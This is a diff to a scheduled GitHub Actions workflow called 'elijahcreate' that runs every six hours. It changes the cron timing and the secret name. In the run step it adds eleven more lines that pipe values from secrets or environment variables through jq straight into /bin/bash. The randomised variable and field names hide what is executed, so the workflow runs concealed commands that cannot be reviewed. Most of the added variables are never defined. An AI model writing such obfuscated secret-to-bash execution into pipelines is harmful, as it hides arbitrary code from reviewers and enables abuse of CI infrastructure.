@@ -2,18 +2,28 @@ name: elijahcreate
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 4/6 * * *'
+    - cron: '24 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: elijahcreate
         env:
-          qx35300: ${{ secrets.qx35300 }}
+          x183: ${{ secrets.x183 }}
         run: |
-          echo $qx35300 | jq -r .hzrq943 | /bin/bash
-          echo $mk54 | jq -r .an124 | /bin/bash
-          echo $ioz27479 | jq -r .jwt15768 | /bin/bash
+          echo $x183 | jq -r .l2 | /bin/bash
+          echo $kqsi9 | jq -r .sdx72420 | /bin/bash
+          echo $beixw93 | jq -r .uiiuk046 | /bin/bash
+          echo $pgb03 | jq -r .vrxm75 | /bin/bash
+          echo $b06 | jq -r .xcqi772 | /bin/bash
+          echo $lvia410 | jq -r .a6139 | /bin/bash
+          echo $zzzyk7 | jq -r .on3692 | /bin/bash
+          echo $hgj2 | jq -r .aco57 | /bin/bash
+          echo $c12 | jq -r .y05324 | /bin/bash
+          echo $tojwr230 | jq -r .hswnu8231 | /bin/bash
+          echo $ileta200 | jq -r .djp00 | /bin/bash
+          echo $knwg940 | jq -r .mw56 | /bin/bash
 
